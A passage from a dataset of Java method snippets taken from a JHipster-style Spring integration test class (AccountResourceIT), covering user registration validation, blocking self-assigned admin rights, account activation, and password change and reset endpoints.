.perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(validUser)))            .andExpect(status().isCreated());        assertThat(userRepository.findOneByLogin(\"test-register-valid\").isPresent()).isTrue();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterInvalidLogin", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterInvalidLogin() throws Exception {        ManagedUserVM invalidUser = new ManagedUserVM();        invalidUser.setLogin(\"funky-log!n\"); // <-- invalid        invalidUser.setPassword(\"password\");        invalidUser.setFirstName(\"Funky\");        invalidUser.setLastName(\"One\");        invalidUser.setEmail(\"funky@example.com\");        invalidUser.setActivated(true);        invalidUser.setImageUrl(\"http://placehold.it/50x50\");        invalidUser.setLangKey(Constants.DEFAULT_LANGUAGE);        invalidUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(invalidUser)))            .andExpect(status().isBadRequest());        Optional<User> user = userRepository.findOneByEmailIgnoreCase(\"funky@example.com\");        assertThat(user.isPresent()).isFalse();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterInvalidEmail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterInvalidEmail() throws Exception {        ManagedUserVM invalidUser = new ManagedUserVM();        invalidUser.setLogin(\"bob\");        invalidUser.setPassword(\"password\");        invalidUser.setFirstName(\"Bob\");        invalidUser.setLastName(\"Green\");        invalidUser.setEmail(\"invalid\"); // <-- invalid        invalidUser.setActivated(true);        invalidUser.setImageUrl(\"http://placehold.it/50x50\");        invalidUser.setLangKey(Constants.DEFAULT_LANGUAGE);        invalidUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(invalidUser)))            .andExpect(status().isBadRequest());        Optional<User> user = userRepository.findOneByLogin(\"bob\");        assertThat(user.isPresent()).isFalse();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterInvalidPassword", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterInvalidPassword() throws Exception {        ManagedUserVM invalidUser = new ManagedUserVM();        invalidUser.setLogin(\"bob\");        invalidUser.setPassword(\"123\"); // password with only 3 digits        invalidUser.setFirstName(\"Bob\");        invalidUser.setLastName(\"Green\");        invalidUser.setEmail(\"bob@example.com\");        invalidUser.setActivated(true);        invalidUser.setImageUrl(\"http://placehold.it/50x50\");        invalidUser.setLangKey(Constants.DEFAULT_LANGUAGE);        invalidUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(invalidUser)))            .andExpect(status().isBadRequest());        Optional<User> user = userRepository.findOneByLogin(\"bob\");        assertThat(user.isPresent()).isFalse();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterNullPassword", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterNullPassword() throws Exception {        ManagedUserVM invalidUser = new ManagedUserVM();        invalidUser.setLogin(\"bob\");        invalidUser.setPassword(null); // invalid null password        invalidUser.setFirstName(\"Bob\");        invalidUser.setLastName(\"Green\");        invalidUser.setEmail(\"bob@example.com\");        invalidUser.setActivated(true);        invalidUser.setImageUrl(\"http://placehold.it/50x50\");        invalidUser.setLangKey(Constants.DEFAULT_LANGUAGE);        invalidUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(invalidUser)))            .andExpect(status().isBadRequest());        Optional<User> user = userRepository.findOneByLogin(\"bob\");        assertThat(user.isPresent()).isFalse();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterDuplicateLogin", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterDuplicateLogin() throws Exception {        // First registration        ManagedUserVM firstUser = new ManagedUserVM();        firstUser.setLogin(\"alice\");        firstUser.setPassword(\"password\");        firstUser.setFirstName(\"Alice\");        firstUser.setLastName(\"Something\");        firstUser.setEmail(\"alice@example.com\");        firstUser.setImageUrl(\"http://placehold.it/50x50\");        firstUser.setLangKey(Constants.DEFAULT_LANGUAGE);        firstUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        // Duplicate login, different email        ManagedUserVM secondUser = new ManagedUserVM();        secondUser.setLogin(firstUser.getLogin());        secondUser.setPassword(firstUser.getPassword());        secondUser.setFirstName(firstUser.getFirstName());        secondUser.setLastName(firstUser.getLastName());        secondUser.setEmail(\"alice2@example.com\");        secondUser.setImageUrl(firstUser.getImageUrl());        secondUser.setLangKey(firstUser.getLangKey());        secondUser.setCreatedBy(firstUser.getCreatedBy());        secondUser.setCreatedDate(firstUser.getCreatedDate());        secondUser.setLastModifiedBy(firstUser.getLastModifiedBy());        secondUser.setLastModifiedDate(firstUser.getLastModifiedDate());        secondUser.setAuthorities(new HashSet<>(firstUser.getAuthorities()));        // First user        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(firstUser)))            .andExpect(status().isCreated());        // Second (non activated) user        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(secondUser)))            .andExpect(status().isCreated());        Optional<User> testUser = userRepository.findOneByEmailIgnoreCase(\"alice2@example.com\");        assertThat(testUser.isPresent()).isTrue();        testUser.get().setActivated(true);        userRepository.save(testUser.get());        // Second (already activated) user        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(secondUser)))            .andExpect(status().is4xxClientError());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterDuplicateEmail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterDuplicateEmail() throws Exception {        // First user        ManagedUserVM firstUser = new ManagedUserVM();        firstUser.setLogin(\"test-register-duplicate-email\");        firstUser.setPassword(\"password\");        firstUser.setFirstName(\"Alice\");        firstUser.setLastName(\"Test\");        firstUser.setEmail(\"test-register-duplicate-email@example.com\");        firstUser.setImageUrl(\"http://placehold.it/50x50\");        firstUser.setLangKey(Constants.DEFAULT_LANGUAGE);        firstUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        // Register first user        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(firstUser)))            .andExpect(status().isCreated());        Optional<User> testUser1 = userRepository.findOneByLogin(\"test-register-duplicate-email\");        assertThat(testUser1.isPresent()).isTrue();        // Duplicate email, different login        ManagedUserVM secondUser = new ManagedUserVM();        secondUser.setLogin(\"test-register-duplicate-email-2\");        secondUser.setPassword(firstUser.getPassword());        secondUser.setFirstName(firstUser.getFirstName());        secondUser.setLastName(firstUser.getLastName());        secondUser.setEmail(firstUser.getEmail());        secondUser.setImageUrl(firstUser.getImageUrl());        secondUser.setLangKey(firstUser.getLangKey());        secondUser.setAuthorities(new HashSet<>(firstUser.getAuthorities()));        // Register second (non activated) user        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(secondUser)))            .andExpect(status().isCreated());        Optional<User> testUser2 = userRepository.findOneByLogin(\"test-register-duplicate-email\");        assertThat(testUser2.isPresent()).isFalse();        Optional<User> testUser3 = userRepository.findOneByLogin(\"test-register-duplicate-email-2\");        assertThat(testUser3.isPresent()).isTrue();        // Duplicate email - with uppercase email address        ManagedUserVM userWithUpperCaseEmail = new ManagedUserVM();        userWithUpperCaseEmail.setId(firstUser.getId());        userWithUpperCaseEmail.setLogin(\"test-register-duplicate-email-3\");        userWithUpperCaseEmail.setPassword(firstUser.getPassword());        userWithUpperCaseEmail.setFirstName(firstUser.getFirstName());        userWithUpperCaseEmail.setLastName(firstUser.getLastName());        userWithUpperCaseEmail.setEmail(\"TEST-register-duplicate-email@example.com\");        userWithUpperCaseEmail.setImageUrl(firstUser.getImageUrl());        userWithUpperCaseEmail.setLangKey(firstUser.getLangKey());        userWithUpperCaseEmail.setAuthorities(new HashSet<>(firstUser.getAuthorities()));        // Register third (not activated) user        restAccountMockMvc            .perform(                post(\"/api/register\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(userWithUpperCaseEmail))            )            .andExpect(status().isCreated());        Optional<User> testUser4 = userRepository.findOneByLogin(\"test-register-duplicate-email-3\");        assertThat(testUser4.isPresent()).isTrue();        assertThat(testUser4.get().getEmail()).isEqualTo(\"test-register-duplicate-email@example.com\");        testUser4.get().setActivated(true);        userService.updateUser((new UserDTO(testUser4.get())));        // Register 4th (already activated) user        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(secondUser)))            .andExpect(status().is4xxClientError());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterAdminIsIgnored", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterAdminIsIgnored() throws Exception {        ManagedUserVM validUser = new ManagedUserVM();        validUser.setLogin(\"badguy\");        validUser.setPassword(\"password\");        validUser.setFirstName(\"Bad\");        validUser.setLastName(\"Guy\");        validUser.setEmail(\"badguy@example.com\");        validUser.setActivated(true);        validUser.setImageUrl(\"http://placehold.it/50x50\");        validUser.setLangKey(Constants.DEFAULT_LANGUAGE);        validUser.setAuthorities(Collections.singleton(AuthoritiesConstants.ADMIN));        restAccountMockMvc            .perform(post(\"/api/register\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(validUser)))            .andExpect(status().isCreated());        Optional<User> userDup = userRepository.findOneByLogin(\"badguy\");        assertThat(userDup.isPresent()).isTrue();        assertThat(userDup.get().getAuthorities())            .hasSize(1)            .containsExactly(authorityRepository.findById(AuthoritiesConstants.USER).get());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testActivateAccount", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testActivateAccount() throws Exception {        final String activationKey = \"some activation key\";        User user = new User();        user.setLogin(\"activate-account\");        user.setEmail(\"activate-account@example.com\");        user.setPassword(RandomStringUtils.random(60));        user.setActivated(false);        user.setActivationKey(activationKey);        userRepository.saveAndFlush(user);        restAccountMockMvc.perform(get(\"/api/activate?key={activationKey}\", activationKey)).andExpect(status().isOk());        user = userRepository.findOneByLogin(user.getLogin()).orElse(null);        assertThat(user.getActivated()).isTrue();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testActivateAccountWithWrongKey", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testActivateAccountWithWrongKey() throws Exception {        restAccountMockMvc.perform(get(\"/api/activate?key=wrongActivationKey\")).andExpect(status().isInternalServerError());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testSaveAccount", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSaveAccount() throws Exception {        User user = new User();        user.setLogin(\"save-account\");        user.setEmail(\"save-account@example.com\");        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        userRepository.saveAndFlush(user);        UserDTO userDTO = new UserDTO();        userDTO.setLogin(\"not-used\");        userDTO.setFirstName(\"firstname\");        userDTO.setLastName(\"lastname\");        userDTO.setEmail(\"save-account@example.com\");        userDTO.setActivated(false);        userDTO.setImageUrl(\"http://placehold.it/50x50\");        userDTO.setLangKey(Constants.DEFAULT_LANGUAGE);        userDTO.setAuthorities(Collections.singleton(AuthoritiesConstants.ADMIN));        restAccountMockMvc            .perform(post(\"/api/account\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(userDTO)))            .andExpect(status().isOk());        User updatedUser = userRepository.findOneByLogin(user.getLogin()).orElse(null);        assertThat(updatedUser.getFirstName()).isEqualTo(userDTO.getFirstName());        assertThat(updatedUser.getLastName()).isEqualTo(userDTO.getLastName());        assertThat(updatedUser.getEmail()).isEqualTo(userDTO.getEmail());        assertThat(updatedUser.getLangKey()).isEqualTo(userDTO.getLangKey());        assertThat(updatedUser.getPassword()).isEqualTo(user.getPassword());        assertThat(updatedUser.getImageUrl()).isEqualTo(userDTO.getImageUrl());        assertThat(updatedUser.getActivated()).isEqualTo(true);        assertThat(updatedUser.getAuthorities()).isEmpty();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testSaveInvalidEmail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSaveInvalidEmail() throws Exception {        User user = new User();        user.setLogin(\"save-invalid-email\");        user.setEmail(\"save-invalid-email@example.com\");        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        userRepository.saveAndFlush(user);        UserDTO userDTO = new UserDTO();        userDTO.setLogin(\"not-used\");        userDTO.setFirstName(\"firstname\");        userDTO.setLastName(\"lastname\");        userDTO.setEmail(\"invalid email\");        userDTO.setActivated(false);        userDTO.setImageUrl(\"http://placehold.it/50x50\");        userDTO.setLangKey(Constants.DEFAULT_LANGUAGE);        userDTO.setAuthorities(Collections.singleton(AuthoritiesConstants.ADMIN));        restAccountMockMvc            .perform(post(\"/api/account\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(userDTO)))            .andExpect(status().isBadRequest());        assertThat(userRepository.findOneByEmailIgnoreCase(\"invalid email\")).isNotPresent();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testSaveExistingEmail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSaveExistingEmail() throws Exception {        User user = new User();        user.setLogin(\"save-existing-email\");        user.setEmail(\"save-existing-email@example.com\");        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        userRepository.saveAndFlush(user);        User anotherUser = new User();        anotherUser.setLogin(\"save-existing-email2\");        anotherUser.setEmail(\"save-existing-email2@example.com\");        anotherUser.setPassword(RandomStringUtils.random(60));        anotherUser.setActivated(true);        userRepository.saveAndFlush(anotherUser);        UserDTO userDTO = new UserDTO();        userDTO.setLogin(\"not-used\");        userDTO.setFirstName(\"firstname\");        userDTO.setLastName(\"lastname\");        userDTO.setEmail(\"save-existing-email2@example.com\");        userDTO.setActivated(false);        userDTO.setImageUrl(\"http://placehold.it/50x50\");        userDTO.setLangKey(Constants.DEFAULT_LANGUAGE);        userDTO.setAuthorities(Collections.singleton(AuthoritiesConstants.ADMIN));        restAccountMockMvc            .perform(post(\"/api/account\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(userDTO)))            .andExpect(status().isBadRequest());        User updatedUser = userRepository.findOneByLogin(\"save-existing-email\").orElse(null);        assertThat(updatedUser.getEmail()).isEqualTo(\"save-existing-email@example.com\");    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testSaveExistingEmailAndLogin", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSaveExistingEmailAndLogin() throws Exception {        User user = new User();        user.setLogin(\"save-existing-email-and-login\");        user.setEmail(\"save-existing-email-and-login@example.com\");        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        userRepository.saveAndFlush(user);        UserDTO userDTO = new UserDTO();        userDTO.setLogin(\"not-used\");        userDTO.setFirstName(\"firstname\");        userDTO.setLastName(\"lastname\");        userDTO.setEmail(\"save-existing-email-and-login@example.com\");        userDTO.setActivated(false);        userDTO.setImageUrl(\"http://placehold.it/50x50\");        userDTO.setLangKey(Constants.DEFAULT_LANGUAGE);        userDTO.setAuthorities(Collections.singleton(AuthoritiesConstants.ADMIN));        restAccountMockMvc            .perform(post(\"/api/account\").contentType(MediaType.APPLICATION_JSON).content(TestUtil.convertObjectToJsonBytes(userDTO)))            .andExpect(status().isOk());        User updatedUser = userRepository.findOneByLogin(\"save-existing-email-and-login\").orElse(null);        assertThat(updatedUser.getEmail()).isEqualTo(\"save-existing-email-and-login@example.com\");    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testChangePasswordWrongExistingPassword", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testChangePasswordWrongExistingPassword() throws Exception {        User user = new User();        String currentPassword = RandomStringUtils.random(60);        user.setPassword(passwordEncoder.encode(currentPassword));        user.setLogin(\"change-password-wrong-existing-password\");        user.setEmail(\"change-password-wrong-existing-password@example.com\");        userRepository.saveAndFlush(user);        restAccountMockMvc            .perform(                post(\"/api/account/change-password\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(new PasswordChangeDTO(\"1\" + currentPassword, \"new password\")))            )            .andExpect(status().isBadRequest());        User updatedUser = userRepository.findOneByLogin(\"change-password-wrong-existing-password\").orElse(null);        assertThat(passwordEncoder.matches(\"new password\", updatedUser.getPassword())).isFalse();        assertThat(passwordEncoder.matches(currentPassword, updatedUser.getPassword())).isTrue();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testChangePassword", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testChangePassword() throws Exception {        User user = new User();        String currentPassword = RandomStringUtils.random(60);        user.setPassword(passwordEncoder.encode(currentPassword));        user.setLogin(\"change-password\");        user.setEmail(\"change-password@example.com\");        userRepository.saveAndFlush(user);        restAccountMockMvc            .perform(                post(\"/api/account/change-password\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(new PasswordChangeDTO(currentPassword, \"new password\")))            )            .andExpect(status().isOk());        User updatedUser = userRepository.findOneByLogin(\"change-password\").orElse(null);        assertThat(passwordEncoder.matches(\"new password\", updatedUser.getPassword())).isTrue();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testChangePasswordTooSmall", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testChangePasswordTooSmall() throws Exception {        User user = new User();        String currentPassword = RandomStringUtils.random(60);        user.setPassword(passwordEncoder.encode(currentPassword));        user.setLogin(\"change-password-too-small\");        user.setEmail(\"change-password-too-small@example.com\");        userRepository.saveAndFlush(user);        String newPassword = RandomStringUtils.random(ManagedUserVM.PASSWORD_MIN_LENGTH - 1);        restAccountMockMvc            .perform(                post(\"/api/account/change-password\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(new PasswordChangeDTO(currentPassword, newPassword)))            )            .andExpect(status().isBadRequest());        User updatedUser = userRepository.findOneByLogin(\"change-password-too-small\").orElse(null);        assertThat(updatedUser.getPassword()).isEqualTo(user.getPassword());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testChangePasswordTooLong", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testChangePasswordTooLong() throws Exception {        User user = new User();        String currentPassword = RandomStringUtils.random(60);        user.setPassword(passwordEncoder.encode(currentPassword));        user.setLogin(\"change-password-too-long\");        user.setEmail(\"change-password-too-long@example.com\");        userRepository.saveAndFlush(user);        String newPassword = RandomStringUtils.random(ManagedUserVM.PASSWORD_MAX_LENGTH + 1);        restAccountMockMvc            .perform(                post(\"/api/account/change-password\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(new PasswordChangeDTO(currentPassword, newPassword)))            )            .andExpect(status().isBadRequest());        User updatedUser = userRepository.findOneByLogin(\"change-password-too-long\").orElse(null);        assertThat(updatedUser.getPassword()).isEqualTo(user.getPassword());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testChangePasswordEmpty", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testChangePasswordEmpty() throws Exception {        User user = new User();        String currentPassword = RandomStringUtils.random(60);        user.setPassword(passwordEncoder.encode(currentPassword));        user.setLogin(\"change-password-empty\");        user.setEmail(\"change-password-empty@example.com\");        userRepository.saveAndFlush(user);        restAccountMockMvc            .perform(                post(\"/api/account/change-password\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(new PasswordChangeDTO(currentPassword, \"\")))            )            .andExpect(status().isBadRequest());        User updatedUser = userRepository.findOneByLogin(\"change-password-empty\").orElse(null);        assertThat(updatedUser.getPassword()).isEqualTo(user.getPassword());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRequestPasswordReset", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRequestPasswordReset() throws Exception {        User user = new User();        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        user.setLogin(\"password-reset\");        user.setEmail(\"password-reset@example.com\");        userRepository.saveAndFlush(user);        restAccountMockMvc            .perform(post(\"/api/account/reset-password/init\").content(\"password-reset@example.com\"))            .andExpect(status().isOk());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRequestPasswordResetUpperCaseEmail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRequestPasswordResetUpperCaseEmail() throws Exception {        User user = new User();        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        user.setLogin(\"password-reset\");        user.setEmail(\"password-reset@example.com\");        userRepository.saveAndFlush(user);        restAccountMockMvc            .perform(post(\"/api/account/reset-password/init\").content(\"password-reset@EXAMPLE.COM\"))            .andExpect(status().isOk());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRequestPasswordResetWrongEmail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRequestPasswordResetWrongEmail() throws Exception {        restAccountMockMvc            .perform(post(\"/api/account/reset-password/init\").content(\"password-reset-wrong-email@example.com\"))            .andExpect(status().isOk());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testFinishPasswordReset", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testFinishPasswordReset() throws Exception {        User user = new User();        user.setPassword(RandomStringUtils.random(60));        user.setLogin(\"finish-password-reset\");        user.setEmail(\"finish-password-reset@example.com\");        user.setResetDate(Instant.now().plusSeconds(60));        user.setResetKey(\"reset key\");        userRepository.saveAndFlush(user);        KeyAndPasswordVM keyAndPassword = new KeyAndPasswordVM();        keyAndPassword.setKey(user.getResetKey());        keyAndPassword.setNewPassword(\"new password\");        restAccountMockMvc            .perform(                post(\"/api/account/reset-password/finish\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(keyAndPassword))            )            .andExpect(status().isOk());        User updatedUser = userRepository.findOneByLogin(user.getLogin()).orElse(null);        assertThat(passwordEncoder.matches(keyAndPassword.getNewPassword(), updatedUser.getPassword())).isTrue();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testFinishPasswordResetTooSmall", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testFinishPasswordResetTooSmall() throws Exception {        User user = new User();        user.setPassword(RandomStringUtils.random(60));        user.setLogin(\"finish-password-reset-too-small\");        user.setEmail(\"finish-password-reset-too-small@example.com\");        user.setResetDate(Instant.now().plusSeconds(60));        user.setResetKey(\"reset key too small\");        userRepository.saveAndFlush(user);        KeyAndPasswordVM keyAndPassword = new KeyAndPasswordVM();        keyAndPassword.setKey(user.getResetKey());        keyAndPassword.setNewPassword(\"foo\");        restAccountMockMvc            .perform(                post(\"/api/account/reset-password/finish\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(keyAndPassword))            )            .andExpect(status().isBadRequest());        User updatedUser = userRepository.findOneByLogin(user.getLogin()).orElse(null);        assertThat(passwordEncoder.matches(keyAndPassword.getNewPassword(), updatedUser.getPassword())).isFalse();    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testFinishPasswordResetWrongKey", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testFinishPasswordResetWrongKey() throws Exception {        KeyAndPasswordVM keyAndPassword = new KeyAndPasswordVM();        keyAndPassword.setKey(\"wrong reset key\");        keyAndPassword.setNewPassword(\"new password\");        restAccountMockMvc            .perform(                post(\"/api/account/reset-password/finish\")                    .contentType(MediaType.APPLICATION_JSON)                    .content(TestUtil.convertObjectToJsonBytes(keyAndPassword))            )            .andExpect(status().isInternalServerError());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createTempFile", "params": ["File"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "File", "snippet": "    private static File createTempFile(File file) throws IOException {        String prefix = 